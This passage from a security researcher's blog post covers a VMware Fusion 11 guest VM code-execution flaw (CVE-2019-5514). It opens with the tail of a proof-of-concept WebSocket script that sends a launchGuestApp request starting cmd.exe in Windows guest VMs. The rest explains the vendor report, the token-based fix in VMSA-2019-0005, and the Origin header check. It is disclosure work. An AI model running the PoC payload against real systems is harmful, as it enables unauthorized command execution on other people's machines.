</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>	<span style="color:#069;font-weight:bold">const</span> payload <span style="color:#555">=</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;name&#34;</span><span style="color:#555">:</span><span style="color:#c30">&#34;menu.onAction&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;userInfo&#34;</span><span style="color:#555">:</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#c30">&#34;action&#34;</span><span style="color:#555">:</span><span style="color:#c30">&#34;launchGuestApp:&#34;</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#c30">&#34;selectedIndex&#34;</span><span style="color:#555">:</span>i,
</span></span><span style="display:flex;"><span>			<span style="color:#c30">&#34;representedObject&#34;</span><span style="color:#555">:</span><span style="color:#c30">&#34;cmd.exe&#34;</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			};
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">if</span> (vmlist[i].name.includes(<span style="color:#c30">&#34;Win&#34;</span>) <span style="color:#555">||</span> vmlist[i].name.includes(<span style="color:#c30">&#34;win&#34;</span>)) {ws.send(JSON.stringify(payload));}			
</span></span><span style="display:flex;"><span>	}	
</span></span><span style="display:flex;"><span>	ws.close();
</span></span><span style="display:flex;"><span>	};
</span></span><span style="display:flex;"><span><span style="color:#555">&lt;</span><span style="color:#a00;background-color:#faa">/script&gt;</span>
</span></span></code></pre></div><h2 id="reporting-to-vmware">Reporting to VMware</h2>
<p>At this point I got in touch with @Codecolorist if he reported this to VMware, and he said that yes, they got in touch with him. I decided to send them another report, as I found this pretty serious and I wanted to urge them, especially because compared to the original POC I found a way to execute this attack without that.</p>
<h2 id="the-fix">The Fix</h2>
<p>VMware released a fix, and advisory a couple of days ago: <a href="https://www.vmware.com/security/advisories/VMSA-2019-0005.html">VMSA-2019-0005</a>. I took a look at what they did, and essentially they implemented a token authentication, where the token is newly generated every single time starting up VMware.</p>
<p>This is the related code for generating a token (taken from app.asar):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#366">String</span>.prototype.pick <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">function</span>(min, max) {
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">var</span> n,
</span></span><span style="display:flex;"><span>      chars <span style="color:#555">=</span> <span style="color:#c30">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">if</span> (<span style="color:#069;font-weight:bold">typeof</span> max <span style="color:#555">===</span> <span style="color:#c30">&#39;undefined&#39;</span>) {
</span></span><span style="display:flex;"><span>      n <span style="color:#555">=</span> min;
</span></span><span style="display:flex;"><span>   } <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>      n <span style="color:#555">=</span> min <span style="color:#555">+</span> <span style="color:#366">Math</span>.floor(<span style="color:#366">Math</span>.random() <span style="color:#555">*</span> (max <span style="color:#555">-</span> min <span style="color:#555">+</span> <span style="color:#f60">1</span>));
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">for</span> (<span style="color:#069;font-weight:bold">var</span> i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> n; i<span style="color:#555">++</span>) {
</span></span><span style="display:flex;"><span>      chars <span style="color:#555">+=</span> <span style="color:#069;font-weight:bold">this</span>.charAt(<span style="color:#366">Math</span>.floor(<span style="color:#366">Math</span>.random() <span style="color:#555">*</span> <span style="color:#069;font-weight:bold">this</span>.length));
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">return</span> chars;
</span></span><span style="display:flex;"><span><span style="color:#366">String</span>.prototype.shuffle <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">function</span>() {
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">var</span> array <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">this</span>.split(<span style="color:#c30">&#39;&#39;</span>);
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">var</span> tmp,
</span></span><span style="display:flex;"><span>      current,
</span></span><span style="display:flex;"><span>      top <span style="color:#555">=</span> array.length;
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">if</span> (top)
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">while</span> (<span style="color:#555">--</span>top) {
</span></span><span style="display:flex;"><span>         current <span style="color:#555">=</span> <span style="color:#366">Math</span>.floor(<span style="color:#366">Math</span>.random() <span style="color:#555">*</span> (top <span style="color:#555">+</span> <span style="color:#f60">1</span>));
</span></span><span style="display:flex;"><span>         tmp <span style="color:#555">=</span> array[current];
</span></span><span style="display:flex;"><span>         array[current] <span style="color:#555">=</span> array[top];
</span></span><span style="display:flex;"><span>         array[top] <span style="color:#555">=</span> tmp;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">return</span> array.join(<span style="color:#c30">&#39;&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">export</span> <span style="color:#069;font-weight:bold">class</span> Token {
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">public</span> <span style="color:#069;font-weight:bold">static</span> generate()<span style="color:#555">:</span> string {
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">const</span> specials <span style="color:#555">=</span> <span style="color:#c30">&#39;!@#$%^&amp;*()_+{}:&#34;&lt;&gt;?|[];\&#39;,./`~&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">const</span> lowercase <span style="color:#555">=</span> <span style="color:#c30">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">const</span> uppercase <span style="color:#555">=</span> <span style="color:#c30">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">const</span> numbers <span style="color:#555">=</span> <span style="color:#c30">&#39;0123456789&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">const</span> all <span style="color:#555">=</span> specials <span style="color:#555">+</span> lowercase <span style="color:#555">+</span> uppercase <span style="color:#555">+</span> numbers;
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">let</span> token <span style="color:#555">=</span> <span style="color:#c30">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>      token <span style="color:#555">+=</span> specials.pick(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>      token <span style="color:#555">+=</span> lowercase.pick(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>      token <span style="color:#555">+=</span> uppercase.pick(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>      token <span style="color:#555">+=</span> numbers.pick(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>      token <span style="color:#555">+=</span> all.pick(<span style="color:#f60">5</span>, <span style="color:#f60">7</span>);
</span></span><span style="display:flex;"><span>      token <span style="color:#555">=</span> token.shuffle();
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">return</span> Buffer.from(token).toString(<span style="color:#c30">&#39;base64&#39;</span>);
</span></span><span style="display:flex;"><span>   }
</span></span></code></pre></div><p>The token will be a variable length password, containing at least 1 character from app, lower case, numbers and symbols. It will be base64 encoded then, we can see it in Wireshark, when VMware uses this:</p>
<p><img src="https://theevilbit.github.io/images/VMware_Fusion_11_Guest_VM_RCE_CVE-2019-5514/Screenshot%202019-03-30%20at%2015.19.27.png" alt="image2"></p>
<p>And we can also see it being used in the code:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> sendVmrestReady() {
</span></span><span style="display:flex;"><span>   log.info(<span style="color:#c30">&#39;Main#sendVmrestReady&#39;</span>);
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">if</span> (mainWindow) {
</span></span><span style="display:flex;"><span>      mainWindow.webContents.send(<span style="color:#c30">&#39;vmrestReady&#39;</span>, [
</span></span><span style="display:flex;"><span>         <span style="color:#c30">&#39;ws://localhost:&#39;</span> <span style="color:#555">+</span> global[<span style="color:#c30">&#39;port&#39;</span>] <span style="color:#555">+</span> <span style="color:#c30">&#39;/ws?token=&#39;</span> <span style="color:#555">+</span> token,
</span></span><span style="display:flex;"><span>         <span style="color:#c30">&#39;http://localhost:&#39;</span> <span style="color:#555">+</span> global[<span style="color:#c30">&#39;port&#39;</span>],
</span></span><span style="display:flex;"><span>         <span style="color:#c30">&#39;?token=&#39;</span> <span style="color:#555">+</span> token
</span></span><span style="display:flex;"><span>      ]);
</span></span><span style="display:flex;"><span>   }
</span></span></code></pre></div><p>In case you have code execution on a mac you can probably figure this token out, but in that case it doesn’t really matter anyway. The password will essentially limit the ability to exploit the vulnerability remotely.</p>
<p>With some experiments, I also found that you need to set the Origin in the Header to <code>file://</code>, otherwise it will be forbidden, but that you can&rsquo;t set via normal JS calls, as it will be set by the browser. Like this:</p>
<pre tabindex="0"><code>Origin: file://
</code></pre><p>So even if you know the token, you can&rsquo;t trigger this via normal webpages.</p>

      </div>

      <footer>
        


        
      </footer>
    </article>

    
  </section>

      </div>

      <footer class="footer">
  <section class="container">
    
     © 2023
    
       · 
      Blog created by <a href="https://twitter.com/theevilbit">@theevilbit</a>.
    
    
  </section>
</footer>

    </main>

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-151008930-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

  </body>

</html>
